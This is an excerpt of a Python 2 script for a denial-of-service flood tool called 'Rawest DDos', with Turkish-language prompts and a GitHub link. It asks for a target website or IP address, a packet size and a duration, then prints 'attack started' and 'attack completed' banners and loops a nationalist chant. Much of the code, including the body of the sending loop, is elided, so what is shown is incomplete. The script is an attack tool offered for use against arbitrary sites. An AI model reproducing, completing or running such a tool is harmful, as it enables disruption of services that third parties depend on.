import socket 
 ...
 print("\033[33m\033[1m       By Rawest \033[31m8h4i\033[0m") 
  
 attack = raw_input("\n\n\n\033[Web site veya ip adresi yaz ==> \033[33m") 
  
 print("\n\n\tPaket büyüklüğü yaz(1-6000) \n") 
 package = input("\033[0m\033[1mFlood Size ===>\033[33m ") 
 print("\n\n\tKaç saniye olacağını seç (sec) \n") 
 ...
 print("Rawest DDos Başladı \033[32m%s \033[33mwith \033[32m%s\033[33m bytes for \033[32m%s\033[33m seconds." % (attack, package, duration)) 
 while True: 
 ...
 print("Rawest DDos atak tamamlandı \033[32m%s\033[33m for \033[32m%s\033[33m saniye by Rawest" % (attack, duration)) 
 ...
     print "\033[32m<+> Rawest!! Rawest!! Rawest!! Türkiye!! Rawest!!" 
     sleep(0.1)https://github.com/rawestoffical/Rawestddos
